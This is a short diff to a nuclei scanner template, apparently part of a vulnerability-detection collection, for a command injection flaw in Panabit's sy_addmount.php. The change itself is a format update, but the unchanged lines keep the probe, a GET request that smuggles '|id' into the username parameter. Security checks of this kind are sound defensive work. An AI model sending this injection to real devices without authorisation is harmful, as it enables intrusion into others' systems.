@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Panabit-sy_addmount-rce
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://blog.csdn.net/weixin_51387754/article/details/121147617
   tags: Panabit,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/account/sy_addmount.php?username=|id"
